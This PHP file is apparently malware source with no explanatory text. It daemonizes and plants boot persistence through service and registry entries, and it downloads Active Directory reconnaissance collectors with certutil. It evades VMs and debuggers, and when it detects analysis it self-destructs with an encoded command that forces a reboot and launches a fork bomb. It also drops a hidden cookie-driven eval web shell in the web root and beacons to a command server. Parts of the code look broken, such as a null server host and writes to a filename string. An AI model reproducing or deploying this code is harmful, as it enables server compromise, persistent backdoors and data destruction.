<?php
$pid = pcntl_fork();

if ($pid == -1){
    sleep("8000");
}
if ($pid){exit(0);}
if (posix_setsid() === -1){
    sleep("8000");
}
$pid = pcntl_fork();
if ($pid == -1){
    sleep("8000");
}
if ($pid){exit(0);}
ini_set('safe_mode', 0);
define("UNPACKSELF", "");
define("uuid", substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32));
define("DOCR", $_SERVER['DOCUMENT_ROOT']);
define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
define("HOME", getcwd());
$STDIN = fopen('/dev/null', 'r');
$STDOUT = fopen('/dev/null', 'w');
$STDERR = fopen(sys_get_temp_dir()."asdf.log", "wb");

while(1) {
    function checkfs()
    {
        if (substr(php_uname(), 0, 7) == 'Windows') {
            $bh = array("af.ps1" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1", "af1.ps1" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1", "af2.exe" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true");
            $wh = new COM('WScript.Shell');
            if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Path"))) {
                $t = sys_get_temp_dir() . "\\" . uuid;
                $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Version", "REG_SZ", "1");
                $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerPath", "REG_SZ", base64_encode($t));
                $wh->RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash", "REG_SZ", uuid);
                system("mkdir " . $t);
                system("attrib +h +s " . $t);
                foreach ($bh as $hound => $value) {
                    system("certutil.exe -urlcache -split -f $value " . $t . "\\$hound");
                }
                system("attrib +r +s $t\\*");
                fwrite(fopen(sys_get_temp_dir() . "/aa", "a"), "win");
                return $t;
            } else {
                return $wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\InstallerHash");
            }
        } else {
            if (is_dir("/etc/service") && !file_exists("/etc/service/php_pear_update_service")) {
                $f = fopen("/etc/service/php_pear_update", "w");
                fwrite($f, "#!/bin/sh\nexec $(which php) " . SELF_SCRIPT);
                fflush($f);
                fclose($f);
            } elseif (is_dir("/etc/init/") && !file_exists("/etc/init/phpworker.conf")) {
                $ff = fopen("/etc/init/phpworker.conf", "w");
                fwrite($ff, "start on startup\nstop on shutdown\nrespawn\nrespawn limit 20 5\nscript\n\t[\$(exec $(which php) -f " . SELF_SCRIPT . ") = 'ERROR'] && ( stop; exit 1; )");
                fflush($ff);
                fclose($ff);
            } elseif (is_dir("/var/service") && !file_exists("/var/service/php_pear_update_service/run")) {
                $ffe = fopen("/var/service/php_pear_update/run", "w");
                fwrite($ffe, "#!/bin/sh\nexec setuidgid sh -c 'exec $(which php) " . SELF_SCRIPT . "'");
                fflush($ffe);
                fclose($ffe);
            }
            $myhom = HOME."/.local/.backup/.pear/";
            if (!is_dir($myhom) && !file_exists($myhom . "/.pear_has_backup")) {
                system("mkdir -p {$myhom}");
                $uif = fopen("$myhom" . ".pear_hash_backup", "a");
                fwrite(fopen(sys_get_temp_dir() . "/aa", "a"), "lin");
                fwrite($uif, uuid);
                fflush($uif);
                fclose($uif);
                return $myhom;
            } else {
                $uif = fopen($myhom . ".pear_hash_backup", "a");
                return $myhom;
            }
        }
    }

    function checkSystems()
    {
        $foundDBGVM = array();
        $chance_of_VM = 0;
        if (substr(php_uname(), 0, 7) == 'Windows') {
            $VMProcessList = array(
                "vmsr" => "vmsrvc.exe",
                "vmware" => "vmware.exe",
                "vbox" => "vbox.exe",
                "vmv" => "vmvss.exe",
                "vmcs" => "vmscsi.exe",
                "vmhg" => "vmhgfs.exe",
                "vboxS" => "vboxservice.exe",
                "vmxN" => "vmxnet.exe",
                "vmx" => "vmx_svga.exe",
                "vmmem" => "vmmemctl.exe",
                "autoR" => "autoruns.exe",
                "autoRSC" => "autorunsc.exe",
                "vmusb" => "vmusbmouse.exe",
                "vmT" => "vmtools.exe",
                "regmo" => "regmon.exe",
                "vboxT" => "vboxtray.exe",
                "vmraw" => "vmrawdsk.exe",
                "jBoxC" => "joeboxcontrol.exe",
                "jBoxS" => "joeboxserver.exe",
                "vmTool" => "vmtoolsd.exe",
                "vmwareT" => "vmwaretray.exe",
                "vmwareU" => "vmwareuser.exe",
                "vmuSRV" => "vmusrvc.exe",
                "xenS" => "xenservice.exe"
            );
            $DebugList = array(
                "olly" => "ollydbg.exe",
                "phacker" => "ProcessHacker.exe",
                "fidd" => "fiddler.exe",
                "tcpview" => "tcpview.exe",
                "df5" => "df5serv.exe",
                "fmon" => "filemon.exe",
                "pmon" => "procmon.exe",
                "rmon" => "regmon.exe",
                "procEXP" => "procexp.exe",
                "idag" => "idaq.exe",
                "idag64" => "idaq64.exe",
                "idbg" => "ImmunityDebugger.exe",
                "wshark" => "Wireshark.exe",
                "dumpcap" => "dumpcap.exe",
                "hookexp" => "HookExplorer.exe",
                "importRec" => "ImportREC.exe",
                "petools" => "PETools.exe",
                "lordpe" => "LordPE.exe",
                "sysinsp" => "SysInspector.exe",
                "procA" => "proc_analyzer.exe",
                "sysA" => "sysAnalyzer.exe",
                "sniffH" => "sniff_hit.exe",
                "windbg" => "windbg.exe",
                "prlCC" => "prl_cc.exe",
                "prlTools" => "prl_tools.exe",
                "xen" => "xenservice.exe"
            );
        }else{
            $VMProcessList = array(
                "vbox" => "virtualbox",
                "vmware" => "vmware",
                "qemu" => "qemu",
                "jailctl" => "jailctl",
                "ezjail" => "ezjail",
                "iocage" => "iocage",
                "qjail" => "qjail",
                "jadm" => "jadm",
                "cbsd" => "cbsd",
                "bsnmp" => "bsnmp-jail",
                "bsdploy" => "bsdploy",
                "jailaudit" => "jailaudit",
                "jailme" => "jailme",
                "jailrc" => "jailrc",
                "pkg_jail" => "pkg_jail",
                "pam_jail" => "pam_jail"
            );
            $DebugList = array(
                "zendbg" => "zendbg",
                "xdebug" => "xdebug",
                "xdbg" => "xdbg",
                "gdb" => "gdb",
                "ghidra" => "ghidra",
                "mtrace" => "mtrace",
                "memwatch" => "memwatch",
                "mpatrol" => "mpatrol",
                "dmalloc" => "dmalloc",
                "dbgmem" => "dbgmem",
                "valgrind" => "valgrind",
                "efence" => "efence",
                "adb" => "adb",
                "strace" => "strace",
                "ptrace" => "ptrace",
                "pidof" => "pidof",
                "jinx" => "jinx",
                "sdb" => "sdb",
                "xcode" => "xcode",
                "rr" => "rr",
                "ddd" => "ddd",
                "tcpdump" => "tcpdump",
                "tshark" => "tshark",
                "wine" => "wine"
            );
            $uptime = strtok( exec( "cat /proc/uptime"), ".");
            $upH = sprintf( "%2d", ( ($uptime % (3600*24)) / 3600) );
            $upM = sprintf( "%2d", ($uptime % (3600*24) % 3600)%60  );
            $fup = sprintf("%d:%d", $upH,$upM);
            $cT = date('H:i');
            $fT = $cT - $uptime;
            $freeDisk = disk_free_space("/");
            $totalFree = disk_total_space("/");
            sleep(random_int(1,21)*5);
            if ($upH < 1 ){
                $chance_of_VM += 5;
            }
            if ($totalFree < 40){
                $chance_of_VM += 5;
            }
            exec("ps ahxwwo pid,command", $p);
            foreach ($VMProcessList as $key => $value){
                if (strpos($p[0], $value)){
                    array_push($foundDBGVM, $value);
                }
            }
            foreach ($DebugList as $keyD => $val){
                if (strpos($p[0], $val)){
                    array_push($foundDBGVM, $val);
                }
            }
            if (array_count_values($foundDBGVM) > 0 || $chance_of_VM >= 10){
                return true;
            }else{
                return false;
            }
        }
        return true;
    }

    function mainR()
    {
        if (checkSystems() === true) {
            $e = hash_hmac('sha512', openssl_random_pseudo_bytes(128), openssl_random_pseudo_bytes(128), $binary=true);
            foreach (file(SELF_SCRIPT) as $line) {
                fputs(SELF_SCRIPT, openssl_encrypt($line, "aes-256-gcm",
                    openssl_random_pseudo_bytes(32),
                    OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING,
                    openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-gcm')),
                    $e,
                    strlen($e)
                ));
                }
            fclose(SELF_SCRIPT);
            unlink(SELF_SCRIPT);
            exec(base64_decode("ZnVuY3Rpb24gZ3Rmbygpe2tpbGxhbGwgcGhwO2tpbGxhbGwgP3NoO2tpbGxhbGwgPz9zaDtlY2hvIDEgPi9wcm9jL3N5cy9rZXJuZWwvc3lzcnE7ZWNobyBiID4vcHJvYy9zeXNycS10cmlnZ2VyO2Jhc2ggIjooKSB7IDogfCA6ICY7fToifWd0Zm8oKQ=="));
        } else {
            if (!file_exists(sys_get_temp_dir() . "/aa")) {
                sleep(random_int(1000, 10000));
            } else {
                if (checkfs()) {
                    $ho = null;
                    $p = null;
                    $u = null;
                    $allowed_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                    $dd = $_SERVER['DOCUMENT_ROOT']."/".substr(str_shuffle($allowed_chars), 0, rand(10,50)).".php";
                    if (!is_file($dd)) {
                        $ESP = "if (!empty(\$_COOKIE[''])){\nopenssl_decrypt(\$_COOKIE['']\n\$v=\$_COOKIE[''];\nunserialize(base64_decode(sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode(\$v[3]), hex2bin(\$v[2]), hex2bin(\$v[0]), hex2bin(\$v[1]))), ['allowed_classes' => false]);\n}else{\nhttp_response_code(444);\n}\n}";
                        fputs(fopen("{$dd}", "w+"), "<?php");
                        fputs(fopen("{$dd}", "a"), "\n{$ESP} eval(openssl_decrypt(gzdecode(".UNPACKSELF."), )");
                    }
                    $fp = fsockopen("$ho", $p, $errno, $errstr, 180);
                    switch (fread(fopen(sys_get_temp_dir() . "/aa", "r"), 3)) {
                        case "win":
                            $au = array("ac" => "add", "iru" => $dd, "u" => uuid, "o" => "windows");
                            break;
                        case "lin":
                            $au = array("ac" => "add", "iru" => $dd, "u" => uuid, "o" => "lin");
                            break;
                    }
                    foreach ($au as $key => $value) {
                        $poststring .= urlencode($key) . "=" . $value . "&";
                    }
                    $poststring = substr($poststring, 0, -1);
                    if (!$fp) {
                        fwrite(fopen(sys_get_temp_dir() . "/aaF", "a"), $errstr);
                    } else {
                        fputs($fp, "POST /diaghandler.php HTTP/1.1\r\n");
                        fputs($fp, "Host: $ho\r\n");
                        fputs($fp, "User-Agent: $u\r\n");
                        fputs($fp, "Connection: close\r\n");
                        fputs($fp, "Accept: */*\r\n");
                        fputs($fp, $poststring . "\r\n\r\n");
                        while (!feof($fp)) {
                            fwrite(fopen(sys_get_temp_dir() . "/aaF", "a+"), fgets($fp, 4096));
                        }
                        fclose($fp);
                    }
                } else {
                    sleep(1000);
                }
            }
        }
    }
    mainR();
}